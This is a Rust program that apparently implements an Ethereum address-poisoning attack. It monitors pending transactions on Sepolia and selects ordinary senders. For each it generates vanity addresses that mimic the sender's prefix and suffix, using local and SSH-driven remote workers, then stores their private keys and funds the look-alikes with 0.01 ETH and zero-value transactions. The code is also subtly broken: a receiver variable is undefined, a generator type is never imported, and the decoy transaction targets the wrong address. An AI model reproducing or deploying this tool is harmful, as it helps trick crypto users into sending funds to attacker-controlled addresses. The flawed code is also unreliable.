use ethers::{
    middleware::SignerMiddleware,
    providers::{Middleware, Provider, StreamExt, Ws},
    types::{Address, BlockNumber, H160, U256},
    signers::{LocalWallet, Signer},
};
use rusqlite::{params, Connection};
use ssh2::Session;
use dotenv::dotenv;
use std::env;
use std::io::prelude::*;
use std::net::TcpStream;
use std::sync::Arc;
use tokio::sync::mpsc;
use tokio::time::{timeout, Duration, sleep};
use hex::encode;
use serde_json;
use std::time::{SystemTime, UNIX_EPOCH};
use std::fs::OpenOptions;
use std::io::Write;
use serde::{Deserialize, Serialize};
use vanity_project::generator::KeyPair;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    dotenv().ok();
    let infura_api_key = env::var("INFURA_API_KEY").expect("INFURA_API_KEY not set");
    let ssh_hosts = env::var("SSH_HOSTS")
        .unwrap_or_default()
        .split(',')
        .filter(|s| !s.is_empty())
        .map(|s| s.trim().to_string())
        .collect::<Vec<String>>();
    let ssh_user = env::var("SSH_USER").unwrap_or_default();
    let hot_wallet_threshold: usize = env::var("HOT_WALLET_THRESHOLD")
        .unwrap_or("5".to_string())
        .parse()
        .unwrap_or(5);
    let hot_wallet_window: u64 = env::var("HOT_WALLET_WINDOW")
        .unwrap_or("60".to_string())
        .parse()
        .unwrap_or(60);
    let wallet_private_key = env::var("WALLET_PRIVATE_KEY").expect("WALLET_PRIVATE_KEY not set");
    let log_file = env::var("LOG_FILE").unwrap_or("vanity_logs.txt".to_string());
    let db_file = env::var("DATABASE_FILE").unwrap_or("vanity.db".to_string());

    let conn = Connection::open(&db_file)?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS vanity_addresses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT NOT NULL UNIQUE,
            private_key TEXT NOT NULL,
            prefix TEXT NOT NULL,
            suffix TEXT NOT NULL,
            created_at INTEGER NOT NULL
        )",
        [],
    )?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS errors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT NOT NULL,
            created_at INTEGER NOT NULL
        )",
        [],
    )?;

    let ssh_configs: Vec<(String, String)> = ssh_hosts
        .into_iter()
        .filter_map(|host| {
            let parts: Vec<&str> = host.split(':').collect();
            if parts.len() == 2 {
                Some((parts[0].to_string(), parts[1].to_string()))
            } else {
                None
            }
        })
        .collect();

    let provider = retry(3, Duration::from_secs(5), || async {
        Ws::connect(format!(
            "wss://sepolia.infura.io/v3/{}",
            infura_api_key
        ))
        .await
        .map_err(|e| anyhow::anyhow!("WebSocket connection failed: {}", e))
    })
    .await?;
    let provider = Arc::new(Provider::new(provider));

    let wallet: LocalWallet = wallet_private_key.parse()?;
    let client = Arc::new(SignerMiddleware::new(provider.clone(), wallet));

    for (host, pass) in &ssh_configs {
        if let Err(e) = setup_server(host, &ssh_user, pass, &log_file, &db_file).await {
            log_error(&conn, &log_file, &format!("Setup server {} failed: {}", host, e))?;
        }
    }

    if let Err(e) = check_ssh_connectivity(&ssh_configs, &ssh_user, &log_file, &db_file).await {
        log_error(&conn, &log_file, &format!("SSH check failed: {}", e))?;
        return Err(e);
    }

    let (tx, mut rx) = mpsc::channel::<(KeyPair, String, String)>(100);

    loop {
        let provider_clone = provider.clone();
        let tx_clone = tx.clone();
        let client_clone = client.clone();
        let log_file_clone = log_file.clone();
        let db_file_clone = db_file.clone();
        let ssh_configs_clone = ssh_configs.clone();
        let ssh_user_clone = ssh_user.clone();
        tokio::spawn(async move {
            if let Err(e) = scan_transactions(
                provider_clone,
                tx_clone,
                hot_wallet_threshold,
                hot_wallet_window,
                client_clone,
                &log_file_clone,
                &db_file_clone,
                &ssh_configs_clone,
                &ssh_user_clone,
            )
            .await {
                let conn = Connection::open(&db_file_clone).unwrap();
                log_error(&conn, &log_file_clone, &format!("Scan transactions failed: {}", e)).unwrap();
            }
        });

        if let Ok(Some((keypair, prefix, suffix))) = timeout(Duration::from_secs(600), rx.recv()).await {
            let addr_hex = encode(&keypair.address);
            let priv_key = encode(&keypair.secret);
            let created_at = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();

            conn.execute(
                "INSERT OR IGNORE INTO vanity_addresses (address, private_key, prefix, suffix, created_at)
                 VALUES (?, ?, ?, ?, ?)",
                params![addr_hex, priv_key, prefix, suffix, created_at],
            )?;

            if let Ok(receipt) = retry(3, Duration::from_secs(5), || async {
                let tx = ethers::types::TransactionRequest::new()
                    .to(H160::from(keypair.address))
                    .value(U256::from(10_000_000_000_000_000u64)) // 0.01 ETH
                    .from(client.address());
                client.send_transaction(tx, None).await?.await
            })
            .await
            {
                log_to_file(
                    &log_file,
                    &format!("Sent 0.01 ETH to vanity address: {:?}", receipt.transaction_hash),
                )?;
            } else {
                log_error(&conn, &log_file, "Failed to send 0.01 ETH")?;
            }

            if let Err(e) = retry(3, Duration::from_secs(5), || async {
                let tx = ethers::types::TransactionRequest::new()
                    .to(H160::from(keypair.address))
                    .value(U256::zero())
                    .from(client.address());
                client.send_transaction(tx, None).await?.await
            })
            .await
            {
                log_error(&conn, &log_file, &format!("Failed to send 0 ETH transaction: {}", e))?;
            }
        }
    }
}

async fn retry<T, F, Fut>(max_attempts: u32, delay: Duration, mut f: F) -> anyhow::Result<T>
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = anyhow::Result<T>>,
{
    let mut attempts = 0;
    loop {
        match f().await {
            Ok(result) => return Ok(result),
            Err(_e) if attempts < max_attempts - 1 => {
                attempts += 1;
                sleep(delay).await;
            }
            Err(e) => return Err(e),
        }
    }
}

async fn setup_server(host: &str, user: &str, pass: &str, log_file: &str, db_file: &str) -> anyhow::Result<()> {
    let conn = Connection::open(db_file)?;
    let tcp = retry(3, Duration::from_secs(5), || async {
        TcpStream::connect(format!("{}:22", host))
            .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))
    })
    .await?;
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    sess.userauth_password(user, pass)?;

    let mut channel = sess.channel_session()?;
    channel.exec("rustc --version")?;
    let mut output = String::new();
    channel.read_to_string(&mut output)?;
    channel.close()?;
    channel.wait_close()?;

    if !output.contains("rustc") {
        let mut channel = sess.channel_session()?;
        channel.exec("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y")?;
        channel.close()?;
        channel.wait_close()?;
        log_to_file(log_file, &format!("Installed Rust on {}", host))?;
    }

    let mut channel = sess.channel_session()?;
    let repo_url = "https://github.com/dapslegend/Runity.git";
    channel.exec(&format!(
        "git clone {} /tmp/Runity && cd /tmp/Runity && cargo build --release",
        repo_url
    ))?;
    channel.close()?;
    channel.wait_close()?;
    log_to_file(log_file, &format!("Set up project on {}", host))?;

    Ok(())
}

async fn check_ssh_connectivity(
    configs: &[(String, String)],
    user: &str,
    log_file: &str,
    db_file: &str,
) -> anyhow::Result<()> {
    let conn = Connection::open(db_file)?;
    for (host, pass) in configs {
        let result = retry(3, Duration::from_secs(5), || async {
            let tcp = TcpStream::connect(format!("{}:22", host))
                .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))?;
            let mut sess = Session::new()?;
            sess.set_tcp_stream(tcp);
            sess.handshake()?;
            sess.userauth_password(user, pass)?;
            Ok(())
        })
        .await;
        if let Err(e) = result {
            log_error(&conn, log_file, &format!("SSH connection to {} failed: {}", host, e))?;
            return Err(e);
        }
        log_to_file(log_file, &format!("SSH connection to {} successful", host))?;
    }
    Ok(())
}

async fn scan_transactions(
    provider: Arc<Provider<Ws>>,
    tx: mpsc::Sender<(KeyPair, String, String)>,
    hot_wallet_threshold: usize,
    hot_wallet_window: u64,
    client: Arc<SignerMiddleware<Provider<Ws>, LocalWallet>>,
    log_file: &str,
    db_file: &str,
    ssh_configs: &[(String, String)],
    ssh_user: &str,
) -> anyhow::Result<()> {
    let conn = Connection::open(db_file)?;
    let mut stream = provider.subscribe_pending_txs().await?;
    while let Some(tx_hash) = stream.next().await {
        if let Ok(Some(tx)) = retry(3, Duration::from_secs(5), || async {
            provider.get_transaction(tx_hash)
                .await
                .map_err(|e| anyhow::anyhow!("Get transaction failed: {}", e))
        })
        .await
        {
            if tx.value > U256::zero() && tx.input.is_empty() {
                if let Some(from) = tx.from {
                    let code = provider.get_code(from, None).await?;
                    if code.is_empty() {
                        let is_hot_wallet = is_hot_wallet(
                            &provider,
                            from,
                            hot_wallet_threshold,
                            hot_wallet_window,
                        )
                        .await?;
                        if !is_hot_wallet {
                            let addr_hex = encode(from).to_lowercase();
                            let addr_no_prefix = addr_hex.strip_prefix("0x").unwrap_or(&addr_hex);
                            let prefix = addr_no_prefix.chars().take(4).collect::<String>();
                            let suffix = addr_no_prefix.chars().skip(addr_no_prefix.len() - 5).collect::<String>();
                            log_to_file(
                                log_file,
                                &format!("Processing address: 0x{} (prefix: {}, suffix: {})", addr_hex, prefix, suffix),
                            )?;

                            let mut stmt = conn.prepare(
                                "SELECT address, private_key FROM vanity_addresses WHERE prefix = ? AND suffix = ?"
                            )?;
                            let existing = stmt.query_row(params![prefix, suffix], |row| {
                                Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
                            });
                            if let Ok((address, private_key)) = existing {
                                log_to_file(
                                    log_file,
                                    &format!("Found existing vanity address: 0x{} for prefix: {}, suffix: {}", address, prefix, suffix),
                                )?;
                                let addr_bytes: [u8; 20] = hex::decode(&address)?.try_into().map_err(|_| anyhow::anyhow!("Invalid address"))?;
                                let keypair = KeyPair {
                                    address: addr_bytes,
                                    secret: hex::decode(&private_key)?.try_into().map_err(|_| anyhow::anyhow!("Invalid private key"))?,
                                };
                                tx.send((keypair, prefix, suffix)).await?;
                                continue;
                            }

                            let keypair = timeout(
                                Duration::from_secs(600),
                                generate_vanity_address(&prefix, &suffix, tx.clone(), ssh_configs, ssh_user, log_file, db_file),
                            )
                            .await??;
                            tx.send((keypair, prefix, suffix)).await?;
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

async fn is_hot_wallet(
    provider: &Provider<Ws>,
    address: Address,
    threshold: usize,
    window_secs: u64,
) -> anyhow::Result<bool> {
    let current_block = provider.get_block_number().await?.as_u64();
    let mut tx_count = 0;
    let blocks_per_sec = 1.0 / 12.0;
    let block_window = (window_secs as f64 * blocks_per_sec).ceil() as u64;
    let start_block = current_block.saturating_sub(block_window);

    for block_num in start_block..=current_block {
        if let Some(block) = provider.get_block(BlockNumber::Number(block_num.into())).await? {
            for tx_hash in block.transactions {
                if let Some(tx) = provider.get_transaction(tx_hash).await? {
                    if tx.from == address {
                        tx_count += 1;
                        if tx_count >= threshold {
                            return Ok(true);
                        }
                    }
                }
            }
        }
    }
    Ok(false)
}

async fn generate_vanity_address(
    prefix: &str,
    suffix: &str,
    tx: mpsc::Sender<(KeyPair, String, String)>,
    ssh_configs: &[(String, String)],
    ssh_user: &str,
    log_file: &str,
    db_file: &str,
) -> anyhow::Result<KeyPair> {
    let conn = Connection::open(db_file)?;
    let prefix_clone = prefix.to_string();
    let suffix_clone = suffix.to_string();
    let tx_clone = tx.clone();
    tokio::spawn(async move {
        if let Err(e) = generate_local(&prefix_clone, &suffix_clone, tx_clone).await {
            let conn = Connection::open(db_file).unwrap();
            log_error(&conn, log_file, &format!("Local generation failed: {}", e)).unwrap();
        }
    });

    for (host, pass) in ssh_configs {
        let prefix_clone = prefix.to_string();
        let suffix_clone = suffix.to_string();
        let tx_clone = tx.clone();
        let ssh_user_clone = ssh_user.to_string();
        let host_clone = host.to_string();
        let pass_clone = pass.to_string();
        tokio::spawn(async move {
            if let Err(e) = run_ssh_worker(
                &host_clone,
                &ssh_user_clone,
                &pass_clone,
                &prefix_clone,
                &suffix_clone,
                tx_clone,
            )
            .await
            {
                let conn = Connection::open(db_file).unwrap();
                log_error(&conn, log_file, &format!("SSH worker {} failed: {}", host_clone, e)).unwrap();
            }
        });
    }

    let (keypair, _, _) = rx.recv().await.ok_or_else(|| anyhow::anyhow!("No vanity address found"))?;
    Ok(keypair)
}

async fn generate_local(prefix: &str, suffix: &str, tx: mpsc::Sender<(KeyPair, String, String)>) -> anyhow::Result<()> {
    let generator = VanityGenerator::new(
        if prefix.is_empty() { None } else { Some(prefix.to_string()) },
        if suffix.is_empty() { None } else { Some(suffix.to_string()) },
    )?;
    let keypair = generator.generate()?;
    tx.send((keypair, prefix.to_string(), suffix.to_string())).await?;
    Ok(())
}

async fn run_ssh_worker(
    host: &str,
    user: &str,
    pass: &str,
    prefix: &str,
    suffix: &str,
    tx: mpsc::Sender<(KeyPair, String, String)>,
) -> anyhow::Result<()> {
    let tcp = retry(3, Duration::from_secs(5), || async {
        TcpStream::connect(format!("{}:22", host))
            .map_err(|e| anyhow::anyhow!("TCP connection failed: {}", e))
    })
    .await?;
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    sess.userauth_password(user, pass)?;

    let mut channel = sess.channel_session()?;
    let cmd = format!(
        "cd /tmp/Runity && cargo run --release --bin vanity_gen -- --prefix {} --suffix {}",
        prefix, suffix
    );
    channel.exec(&cmd)?;

    let mut output = String::new();
    channel.read_to_string(&mut output)?;
    channel.close()?;
    channel.wait_close()?;

    if let Ok(keypair_output) = serde_json::from_str::<KeyPairOutput>(&output) {
        let addr_bytes: [u8; 20] = hex::decode(keypair_output.address.strip_prefix("0x").unwrap_or(&keypair_output.address))?
            .try_into()
            .map_err(|_| anyhow::anyhow!("Invalid address"))?;
        let secret_bytes: [u8; 32] = hex::decode(keypair_output.secret.strip_prefix("0x").unwrap_or(&keypair_output.secret))?
            .try_into()
            .map_err(|_| anyhow::anyhow!("Invalid private key"))?;
        let keypair = KeyPair {
            address: addr_bytes,
            secret: secret_bytes,
        };
        tx.send((keypair, prefix.to_string(), suffix.to_string())).await?;
    }

    Ok(())
}

#[derive(Deserialize)]
struct KeyPairOutput {
    address: String,
    secret: String,
}

fn log_to_file(file: &str, message: &str) -> anyhow::Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(file)?;
    writeln!(
        file,
        "[{}] {}",
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
        message
    )?;
    Ok(())
}

fn log_error(conn: &Connection, file: &str, message: &str) -> anyhow::Result<()> {
    log_to_file(file, message)?;
    let created_at = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
    conn.execute(
        "INSERT INTO errors (message, created_at) VALUES (?, ?)",
        params![message, created_at],
    )?;
    Ok(())
}